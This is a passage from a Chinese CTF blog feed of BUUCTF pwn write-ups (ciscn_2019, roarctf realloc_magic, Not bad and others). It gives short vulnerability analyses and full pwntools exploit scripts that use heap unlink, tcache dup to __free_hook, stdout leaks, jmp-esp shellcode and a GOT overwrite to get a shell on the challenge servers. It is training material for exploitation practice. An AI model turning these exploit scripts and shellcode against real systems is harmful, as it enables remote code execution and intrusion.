elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,data):    sla(&#39;choice&#39;,&#39;2&#39;)    sla(&#39;len&#39;,str(size))    sa(&#39;name&#39;,str(data))def edit(idx,size,data):    sla(&#39;ice&#39;,&#39;3&#39;)    sla(&#39;dex&#39;,str(idx))    sla(&#39;len&#39;,str(size))    sa(&#39;name&#39;,str(data))def show():    sla(&#39;choice&#39;,&#39;1&#39;)def free(idx):    sla(&#39;ice&#39;,&#39;4&#39;)    sla(&#39;dex&#39;,str(idx))note = 0x006020C0 + 8add(0x88,&#39;aaaaaaaa&#39;)add(0x100,&#39;bbbbbbbb&#39;)add(0x88,&#39;cccccccc&#39;)payload = p64(0) + p64(0x31) + p64(note-0x18) + p64(note - 0x10) + p64(0) * 2 + p64(0x30)payload += p64(0) * 9 + p64(0x80) + p64(0x110)edit(0,len(payload),payload)free(1)show()ru(&#39;0 : &#39;)libc_base = uu64(r(6)) - 0x3c48e0info_addr(&#39;libc_base&#39;,libc_base)free_hook = 0x3c67a8 + libc_basepayload = p64(libc_base + 0x3c48e0) + p64(0)  + p64(0x88) + p64(free_hook)edit(0,len(payload),payload)rec = rce16[1] + libc_baseedit(0,8,p64(rec))free(2)itr()</code></pre><h2 id="ciscn-2019-s-9"><a href="#ciscn-2019-s-9" class="headerlink" title="ciscn_2019_s_9"></a><code>ciscn_2019_s_9</code></h2><h3 id="分析-18"><a href="#分析-18" class="headerlink" title="分析"></a>分析</h3><p>32位程序，保护全关，目标定位着shellcode去。</p><h4 id="漏洞点-3"><a href="#漏洞点-3" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>栈溢出，可以溢出14个字节，这是32位程序用rop就可以打了。但是为相对麻烦一点。</p><pre><code class="python">.text:08048551             hint            proc near.text:08048551             ; __unwind {.text:08048551 55                          push    ebp.text:08048552 89 E5                       mov     ebp, esp.text:08048554 FF E4                       jmp     esp.text:08048554             hint            endp</code></pre><p>在题目当中，有个hint函数，就是给提示的，提示到<code>jmp esp</code> 这个gadget。</p><p>其中，可以想到在栈溢出中，有给<code>ret addr</code>填上<code>jmp esp</code> ，在接上shellcode。这应该是很经典的用法。</p><p>参考链接：<a href="http://www.atomsec.org/%E5%AE%89%E5%85%A8/%E6%A0%88%E6%BA%A2%E5%87%BAjmp-esp%E5%8E%9F%E7%90%86/" target="_blank" rel="noopener">http://www.atomsec.org/%E5%AE%89%E5%85%A8/%E6%A0%88%E6%BA%A2%E5%87%BAjmp-esp%E5%8E%9F%E7%90%86/</a></p><p>构造思路：</p><pre><code>Payload = overflow + jmp esp address + shellcode</code></pre><p>但是这个题就是只能溢出14字节，返回地址再占用4字节，应该没有10字节这样少的shellcode。</p><p>所以转变一下，栈上填充好shellcode，然后<code>jmp esp address</code>，接着让其执行<code>sub esp,0x28</code>，然后在跳转esp。</p><pre><code>Payload = shellcode + jmp esp address + sub esp,esp + jmp esp</code></pre><p>其实基本都是一样的，后面跟上的，也可以理解为调整esp指针的shellcode。</p><h3 id="esp"><a href="#esp" class="headerlink" title="esp"></a>esp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./ciscn_s_9&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,26283)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()jmp_esp = 0x08048554shellcode= &#39;\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80&#39;shellcode = shellcode.ljust(0x24,&#39;\x00&#39;)gadgets = asm(&#39;sub esp,0x28;jmp esp&#39;)print(gadgets)payload = shellcode + p32(jmp_esp) + gadgets# debug()sl(payload)itr()</code></pre><h2 id="roarctf-2019-realloc-magic"><a href="#roarctf-2019-realloc-magic" class="headerlink" title="roarctf_2019_realloc_magic"></a><code>roarctf_2019_realloc_magic</code></h2><h3 id="分析-19"><a href="#分析-19" class="headerlink" title="分析"></a>分析</h3><h4 id="漏洞点-4"><a href="#漏洞点-4" class="headerlink" title="漏洞点"></a>漏洞点</h4><ul><li>UAF</li></ul><p>程序用realloc函数来分配堆块，因为不熟悉这个搞的我，好久没有做出来。</p><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><h4 id="realloc的特点"><a href="#realloc的特点" class="headerlink" title="realloc的特点"></a>realloc的特点</h4><p>基础功能是改变<code>mem_address</code>所指内存区域的大小为newsize长度。这里就有几种不同的情况</p><ul><li>1.当size为0，这时就相当于free()函数，同时返回值为null</li><li>2.当指针为0，size大于0，相当于malloc函数</li><li>3.size小于等于原来的size，则在原先的基础上缩小，多余的堆块free掉</li><li>4.size大于原来的size，如果<strong>有足够空间</strong>就原基础扩充，空间不足则分配新的内存，并将原来指针指向的堆块旧内容复制到新的堆块内存中，然后再将原来的堆块free掉。</li></ul><p>其中第4点，有足够空间，画图解释一下：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/uqru5B.png" srcset="/img/loading.gif" alt></p><p>由于这个特性，来制作3个堆块A、B、C，B堆块作为进入unsortbin的堆块存在，C是为了防止不让C合并top chunk，然后用A来申请一个size&lt;=（A的size + B的size）的堆块，这样就造成了堆块的重叠。</p><h4 id="利用-IO-2-1-stdout-来泄漏信息"><a href="#利用-IO-2-1-stdout-来泄漏信息" class="headerlink" title="利用 _IO_2_1_stdout_ 来泄漏信息"></a><code>利用 _IO_2_1_stdout_ 来泄漏信息</code></h4><p>参考链接：<br><a href="http://pzhxbz.cn/?p=139" target="_blank" rel="noopener">http://pzhxbz.cn/?p=139</a></p><p><a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p><p><a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p><p>这个题因为有过输出，其<code>_IO_CURRENTLY_PUTTING</code>就是为1的 ，对于<code>_IO_IS_APPENDING</code>这个flag的值，将这个flag搞成1之后，就可以通过修改<code>_IO_buf_base</code>来完成leak。</p><p>在赛题中，很多程序都是用过输出函数进行输出的，基本就是改掉flag，中间的三个变量在输出的过程中都不怎么用得到，直接盖成0,低位覆盖<code>_IO_buf_base</code>为合适的值就可以完成leak。</p><p>Flag 怎么设置，在赛题中还是很随意的：</p><pre><code>0xfbad18870xfbad3c80</code></pre><p>重点就是让<code>stdout-&gt;_IO_read_end == stdout-&gt;_IO_write_base</code></p><p>大体的利用方法就是利用unsorted bin的在tcache或fastbin的fd上留下<code>main_arena</code>的地址，由于<code>_IO_2_1_stdout_</code>与<code>arena</code>只相差4位，且低三位已知，在传入是低3位覆盖fd留下的<code>main_arena</code>的地址，剩余一位可以爆破，概率1/16,从而劫持stdout以达到泄露的目的 。</p><h2 id="exp-21"><a href="#exp-21" class="headerlink" title="exp"></a>exp</h2><pre><code class="python">from pwn import *import timelocal_file  = &#39;./roarctf_2019_realloc_magic&#39;elf = ELF(local_file)# context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,28690)    libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]rce18 = [0x4f2c5,0x4f322,0x10a38c]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,data):    sla(&#39;&gt;&gt;&#39;,&#39;1&#39;)    sla(&#39;?&#39;,str(size))    if int(size) != 0 :        sa(&#39;?&#39;,str(data))def free():    sla(&#39;&gt;&gt;&#39;,&#39;2&#39;)def leak_addr():    add(0x80,&#39;aaaaaaa&#39;)    add(0,&#39;&#39;)    add(0x100,&#39;aaaaaaaa&#39;)    add(0,&#39; &#39;)    add(0x110,&#39; &#39;)    add(0,&#39;&#39;)    add(0x100,&#39;a&#39;)    for i in range(7):        free()    add(0,&#39;1&#39;)    add(0x80,&#39;\x60\x87&#39;)    payload = 17 * p64(0) + p64(0x61) + &#39;\x60\x87&#39;    add(0x190,payload)    add(0,&#39;&#39;)    add(0x100,&#39;\x60\x87&#39;)    add(0,&#39;&#39;)    payload = p64(0xfbad3c80) + &#39;\x00&#39; * 8 * 3 + &#39;\x00&#39;    add(0x100,payload)leak = 0while True:    try:        leak_addr()        ss = io.recvuntil(chr(0x7f),timeout = 0.5)        if len(ss) == 0:            raise Exception(&#39;&#39;)        io.recv(16)        leak = u64(io.recv(8))        if leak == 0x320a6464412e310a:            raise Exception(&#39;&#39;)        break    except Exception:        io.close()        # io = process(&#39;./roarctf_2019_realloc_magic&#39;)        io = remote(&#39;node3.buuoj.cn&#39;,28690)        continueleak = leak &gt;&gt; 16info_addr(&#39;leak&#39;,leak)libc_base = leak - 4110208info_addr(&#39;libc_base&#39;,libc_base)free_hook = 4118760 + libc_basesys_addr = 324832+libc_basesla(&#39;&gt;&gt;&#39;,&#39;666&#39;)add(0x120,&#39;aaaaaaa&#39;)add(0,&#39;&#39;)add(0x130,&#39;aaaaaaaa&#39;)add(0,&#39; &#39;)add(0x160,&#39; &#39;)add(0,&#39;&#39;)add(0x130,&#39;a&#39;)for i in range(7):    free()add(0,&#39;1&#39;)add(0x120,&#39;\x60\x87&#39;)payload = 37 * p64(0) + p64(0x71) + p64(free_hook)add(0x260,payload)add(0,&#39;&#39;)add(0x130,&#39;a&#39;)add(0,&#39;&#39;)one_rec = rce18[1] +libc_baseadd(0x130,p64(one_rec))free()# debug()itr()</code></pre><p>其中exp的爆破stdout部分，可以当作模版使用，来自pzhxbz大佬的。</p><h2 id="ciscn-2019-en-3"><a href="#ciscn-2019-en-3" class="headerlink" title="ciscn_2019_en_3"></a><code>ciscn_2019_en_3</code></h2><h3 id="分析-20"><a href="#分析-20" class="headerlink" title="分析"></a>分析</h3><p>常规堆题，UAF，dup打<code>free_hook_</code>。上来用<code>puts(&amp;s)</code>，来泄漏栈上存在的libc地址。</p><h3 id="exp-22"><a href="#exp-22" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./ciscn_2019_en_3&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,29542)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,data):    sla(&#39;ice&#39;,&#39;1&#39;)    sla(&#39;size&#39;,str(size))    sa(&#39;story&#39;,str(data))def free(idx):    sla(&#39;ice&#39;,&#39;4&#39;)    sla(&#39;dex&#39;,str(idx))payload = &#39;a&#39; * (0x20-8)sa(&#39;name&#39;,payload)sa(&#39;ID&#39;,&#39;chumen77&#39;)ru(&#39;chumen77&#39;)libc_base = uu64(r(6)) - 0x81237info_addr(&#39;libc_base&#39;,libc_base)add(0x50,&#39;aaaaaaaa&#39;)free(0)free(0)free_hook = libc_base + 0x3ed8e8add(0x50,p64(free_hook))add(0x50,p64(free_hook))rec = rce18[1] + libc_baseadd(0x50,p64(rec))free(0)itr()</code></pre><h2 id="极客大挑战2019-Not-bad"><a href="#极客大挑战2019-Not-bad" class="headerlink" title="极客大挑战2019 Not bad"></a>极客大挑战2019 Not bad</h2><h3 id="分析-21"><a href="#分析-21" class="headerlink" title="分析"></a>分析</h3><p>溢出0x18个字节，加上本身的栈长度，读orw 的shellcode内存不是很够用。需要迁移到mmap，进行orw。所以摆在栈上的shellcode就是，来一个read函数，把orw放在mmap上，然后再跳转上去执行即可。并且再次用到 <code>jmp rsp</code> + shellcode.</p><h3 id="exp-23"><a href="#exp-23" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./bad&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,29794)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()mmap = 0x123000jmp_rsp = 0x0000000000400a01# bss = 0x6010B0 - 0x20orw = asm(shellcraft.open(&quot;./flag&quot;))orw += asm(shellcraft.read(3,&quot;rsp&quot;,0x30))orw += asm(shellcraft.write(1,&quot;rsp&quot;,0x30))payload = asm(shellcraft.read(0,mmap + 0x300,0x100)) + asm(&#39;mov rax,0x123300;call rax&#39;)payload = payload.ljust(0x28,&#39;a&#39;)payload += p64(jmp_rsp) +   asm(&#39;sub rsp,0x30;jmp rsp&#39;)sa(&#39;fun&#39;,payload)s(orw)itr()</code></pre><h2 id="ciscn-2019-final-5"><a href="#ciscn-2019-final-5" class="headerlink" title="ciscn_2019_final_5"></a><code>ciscn_2019_final_5</code></h2><h3 id="分析-22"><a href="#分析-22" class="headerlink" title="分析"></a>分析</h3><pre><code>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>保护开的不多，分析和利用起来简单不少。</p><p>这个题难点就是在于发现漏洞点。</p><h4 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h4><pre><code class="c"> __int64 result; // rax  signed int i; // [rsp+4h] [rbp-1Ch]  int size; // [rsp+8h] [rbp-18h]  int idx; // [rsp+Ch] [rbp-14h]  void *buf; // [rsp+10h] [rbp-10h]  __int64 v5; // [rsp+18h] [rbp-8h] printf(&quot;index: &quot;);  idx = read_int();  if ( idx &lt; 0 || idx &gt; 16 )  {    puts(&quot;index is invalid.&quot;);    exit(-1);  }  printf(&quot;size: &quot;);  size = read_int();  if ( size &lt; 0 || size &gt; 0x1000 )  {    puts(&quot;size is invalid.&quot;);    exit(-1);  }  buf = malloc(size);  if ( !buf )  {    puts(&quot;malloc error.&quot;);    exit(-1);  }  printf(&quot;content: &quot;);  read(0, buf, size);  show_diy((__int16)buf);</code></pre><p>可以自定义输入堆的编号，最大可以17个，就感觉有点奇怪。然后以栈上的一个buf来存取分配heap的地址。</p><pre><code class="c">result = sub_400AB0((__int64)buf, idx);  v5 = result;  for ( i = 0; i &lt;= 16; ++i )  {    result = heaplist_idx[i];    if ( !result )    {      heaplist_idx[i] = v5;      result = i;      sizelist[i] = size;      break;    }  }</code></pre><pre><code class="c">__int64 __fastcall sub_400AB0(__int64 a1, int a2){  return a1 | a2;}</code></pre><p>可以看到以堆地址与堆的id进行以来一个<code>|</code> 运算。然后返回回来给v5，然后在存入bss的一段地址中。算是处理过的堆地址。</p><p>尝试研究一下，做完处理是什么样子：</p><p>先分配一个堆号为1 和 16的堆块，看下bss里面是存入了什么。</p><pre><code>x/30gx  0x6020E00x6020e0:       0x0000000000e35270(16)      0x0000000000e35281(0)</code></pre><pre><code>In [2]: hex(0x0e35260 | 16)Out[2]: &#39;0xe35270&#39;In [3]: hex(0x00e35281 | 0)Out[3]: &#39;0xe35281&#39;</code></pre><p>差不多就是这样，但是也可以发现点异样。因为是<code>|</code> 的逻辑运算，在<code>0-0xf</code>是一个轮回后，到了16就又算是一个轮回。<br>既然处理过堆地址，那肯定取出来进行操作时，肯定还会再进行处理回来。下面就是注意怎么处理的。</p><h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><pre><code class="c"> for ( i = 0; i &lt;= 16; ++i )  {    result = get_idx(heaplist_idx[i]);    if ( result == idx )    {      printf(&quot;content: &quot;);      read_diy((void *)(heaplist_idx[i] &amp; 0xFFFFFFFFFFFFFFF0LL), sizelist[i]);      result = puts(&quot;edit success.\n&quot;);      break;    }  }</code></pre><pre><code class="c">__int64 __fastcall get_idx(char a1){  return a1 &amp; 0xF;}</code></pre><p>可以看到其是依次0-17编号对堆块进行遍历取出，再取出时会对其进行<code>&amp; 0xf</code>的操作来尝试获取堆块的编号。</p><p>来测试一下：</p><pre><code class="c">In [5]: hex(0x00e35281 &amp; 0xf). #1号堆块的计算Out[5]: &#39;0x1&#39;In [6]: hex(0x00e35270 &amp; 0xf) #16号堆块的计算Out[6]: &#39;0x0&#39;</code></pre><p>这就很明显有异样了，申请的是16号堆块其认为是0号堆块。所以申请16号的堆块，其可以用edit（0）来进行编辑16号堆块。</p><p>然后看其如何编辑的：</p><pre><code class="c">  read_diy((void *)(heaplist_idx[i] &amp; 0xFFFFFFFFFFFFFFF0LL), sizelist[i]);</code></pre><p>其是根据bss上存的处理过堆块地址进行一下<code>&amp; 0xFFFFFFFFFFFFFFF0</code> 来进行编辑的。<br>对于上来就申请了一个16号的堆块，很容易知道其堆块的末3为应该是0x260，但是当时存入的是0x270，尝试进行一下<code>&amp; 0xFFFFFFFFFFFFFFF0</code>：</p><pre><code>In [7]: hex(0x00e35270 &amp; 0xFFFFFFFFFFFFFFF0)Out[7]: &#39;0xe35270&#39;</code></pre><p>发现并不是从0x260进行编辑，但是同样还是可以编辑同样的size，所以这就造成了溢出，并且是0x10个字节。</p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><ul><li>释放2个tcache 堆块，并且利用0x10字节，改其中一个堆块的fd，改为free的got位置</li><li>申请堆块到free got处，改free 为 puts</li><li>构造出一个unsortbin的堆块，然后再申请一个堆块，就会在这个堆块上留下部分的libc地址，然后进行leak</li><li>算出system的地址，继续改free got 处为 system，然后free一个带有<code>/bin/sh\x00</code>的堆块，即可拿到shell</li></ul><h3 id="exp-24"><a href="#exp-24" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *import timelocal_file  = &#39;./ciscn_final_5&#39;elf = ELF(local_file)# context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,27180)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(idx,size,data):    sla(&#39;choice:&#39;,&#39;1&#39;)    sla(&#39;dex&#39;,str(idx))    sla(&#39;size&#39;,str(size))    sa(&#39;content&#39;,str(data))def free(idx):    sla(&#39;choice:&#39;,&#39;2&#39;)    sla(&#39;dex&#39;,str(idx))def edit(idx,data):    sla(&#39;choice:&#39;,&#39;3&#39;)    sla(&#39;dex&#39;,str(idx))    sa(&#39;content&#39;,str(data))add(16,0x18,&#39;sasdasdas&#39;)add(1,0x30,&#39;aaaaaaaa&#39;)add(2,0x30,&#39;aaaaaaaa&#39;)free(2)free(1)edit(0,p64(0) + p64(0x121) + p64(0x000000000602010))add(5,0x800,&#39;aaaaaaaa&#39;)add(6,0x50,&#39;aaaa&#39;)add(3,0x30,&#39; &#39;)free(5)add(7,0x90,&#39; &#39;)add(4,0x30,&#39;aaaaaaaa&#39; + p64(elf.plt[&#39;puts&#39;]))free(7)r()libc_base = uu64(r(6)) - 0x3ec120info_addr(&#39;libc_base&#39;,libc_base)edit(4,&#39;aaaaaaaa&#39; + p64(libc.sym[&#39;system&#39;] + libc_base))add(9,0x10,&#39;/bin/sh\x00&#39;)free(9)itr()</code></pre><p>由于其确定堆块的特殊性，在申请堆块到free got时，因为其在<code>0x000000000602018</code>，但是在经过逻辑运算处理后，放入bss后，想要再进行操作就有点困难，所以申请到<code>0x000000000602010</code> 就OK了。</p><h2 id="ciscn-2019-s-1"><a href="#ciscn-2019-s-1" class="headerlink" title="ciscn_2019_s_1"></a><code>ciscn_2019_s_1</code></h2><h3 id="分析-23"><a href="#分析-23" class="headerlink" title="分析"></a>分析</h3><p>保护：</p><pre><code>[*] &#39;/ctf/work/buuctf/shuati/ciscn_2019_s_1/ciscn_s_1&#39;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>Add函数：最多可以申请33个堆，且问你堆的编号，并且根据这个编号作为索引上bss段来存储heap的地址。大小范围在<code>0x7f - 0x100</code>。</p><p>edit函数：</p><pre><code class="c">v0[read(0, (void *)heap[v2], (signed int)len[v2])] = 0;</code></pre><p>明显存在着off by null。且有key1控制着，只能编辑2次。</p><pre><code class="c">if ( key1 == 2 )    exit(0);</code></pre><p>Show函数：<br>Key2有值才能用。</p><h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h4><ul><li>由于没有开启pie保护，这样明显可以unlink攻击，申请一个32堆号的堆，大小0xf8，都是越大越好，为了上靠近key1、key2，然后进行控制.</li></ul><p>剩下的就很简单了。</p><h3 id="exp-25"><a href="#exp-25" class="headerlink" title="exp"></a>exp</h3><pre><code class="c">from pwn import *import timelocal_file  = &#39;./ciscn_s_1&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,29756)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(idx,size,data):    sla(&#39;show\n&#39;,&#39;1&#39;)    sla(&#39;dex&#39;,str(idx))    sla(&#39;size&#39;,str(size))    sa(&#39;content&#39;,str(data))def free(idx):    sla(&#39;show\n&#39;,&#39;2&#39;)    sla(&#39;dex&#39;,str(idx))def edit(idx,data):    sla(&#39;show\n&#39;,&#39;3&#39;)    sla(&#39;dex&#39;,str(idx))    sa(&#39;content&#39;,str(data))def show(idx):    sla(&#39;show\n&#39;,&#39;4&#39;)    sla(&#39;dex&#39;,str(idx))key2 = 0x6022B8for i in range(7):    add(i,0xf8,&#39;aaaaaaaa&#39;)add(7,0xf8,&quot;aaaa&quot;)#8payload = p64(0) + p64(0x32) + p64(0x6021e0 - 0x18) + p64(0x6021e0 - 0x10) + p64(0) * 2 + p64(0x30)add(32,0xf8,payload)#32add(8,0x88,&quot;aaaa&quot;)add(9,0xf8,&quot;aaaa&quot;)add(10,0x88,&#39;aaaa&#39;)for i in range(7):    free(i+1) # 由于32的堆块申请后破坏了0号堆块的在bss上地址的储存payload = &#39;a&#39; * 0x80 + p64(0x180)edit(8,payload)free(9)payload = p64(0) * 3 + p64(0x00000000006021c8) + &#39;\x00&#39;  * (0xf0 - 0x8 * 4) + p64(0x0000000400000001)edit(32,payload)add(11,0x88,&#39; &#39;)show(11)r()libc_base = uu64(r(6)) - 0x3ebf20info_addr(&#39;libc_base&#39;,libc_base)free_hook = libc_base + 0x3ed8e8rec = rce18[1] + libc_basepayload = p64(0) * 3 + p64(free_hook)edit(32,payload)edit(32,p64(rec))free(11)itr()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;BUUCTF暑假刷题-1&quot;&gt;&lt;a href=&quot;#BUUCTF暑假刷题-1&quot; class=&quot;headerlink&quot; title=&quot;BUUCTF暑假刷题(1)&quot;&gt;&lt;/a&gt;BUUCTF暑假刷题(1)&lt;/h1&gt;&lt;h2 id=&quot;cmcc-simplerop&quot;&gt;&lt;a href
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>“第五空间” 智能安全大赛-twice</title>
    <link href="http://chumen77.xyz/2020/06/28/%E2%80%9C%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E2%80%9D%20%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <id>http://chumen77.xyz/2020/06/28/“第五空间” 智能安全大赛/</id>
    <published>2020-06-28T12:43:20.845Z</published>
    <updated>2020-07-31T04:17:47.701Z</updated>
    
    <content type="html"><![CDATA[<h1 id="“第五空间”-智能安全大赛"><a href="#“第五空间”-智能安全大赛" class="headerlink" title="“第五空间” 智能安全大赛"></a>“第五空间” 智能安全大赛</h1><p>比赛时当天有考试，就做了个签道题。</p><h2 id="twice"><a href="#twice" class="headerlink" title="twice"></a>twice</h2><h3 id="查保护"><a href="#查保护" class="headerlink" title="查保护"></a>查保护</h3><pre><code class="python">    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><ul><li>程序可以给你2次的读操作，第一次读89字节，第二次读112字节</li><li>栈大小是<code>0x60</code>，存在栈溢出。</li></ul><pre><code class="python">0x7fffffffe3b0 --&gt; 0x6097ecbc626822000x7fffffffe3b8 --&gt; 0x6097ecbc626822000128| 0x7fffffffe3c0 --&gt; 0x7fffffffe3d0 --&gt; 0x4008c0 (&lt;__libc_csu_init&gt;:    push   